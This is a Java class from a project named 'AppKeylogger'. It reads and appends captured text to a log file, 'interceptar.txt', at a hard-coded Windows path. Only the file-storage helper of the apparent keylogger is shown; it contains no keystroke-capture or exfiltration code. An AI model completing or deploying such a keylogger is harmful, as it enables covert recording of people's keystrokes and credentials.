package AppKeylogger;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.sql.Date;

public class capturar  {
	 private static final String filePath = "C:\\Users\\adria\\OneDrive\\Documentos\\keylogger\\interceptar.txt";

     private static String getConteudo(){
           StringBuilder conteudoExistente = new StringBuilder();
           String linhaAtual;
           BufferedReader br;
           try {
                  br = new BufferedReader(new FileReader(filePath));
                  while ((linhaAtual = br.readLine()) != null) {
                         conteudoExistente.append(linhaAtual);
                  }

                  return conteudoExistente.toString();
           } catch (FileNotFoundException e) {
                  // TODO Auto-generated catch block
                  e.printStackTrace();
           } catch (IOException e) {
                  // TODO Auto-generated catch block
                  e.printStackTrace();
           }
           return null;


     }

     public static void escreverTexto(String texto){
           try {

                  File file = new File(filePath);
                  String conteudoAntigo="";
                  if (file.exists()){
                         conteudoAntigo = getConteudo();
                  }else{
                         file.createNewFile();
                  }

                  
                  FileWriter filewt = new FileWriter(file);
                  BufferedWriter bw = new BufferedWriter(filewt);
                  String textoNormal = texto;
                  bw.write(conteudoAntigo);
                  bw.write(" ");
                  bw.write(textoNormal);
                  bw.close();
           } catch (IOException e) {
                  // TODO Auto-generated catch block
                  e.printStackTrace();
           }

     }
}
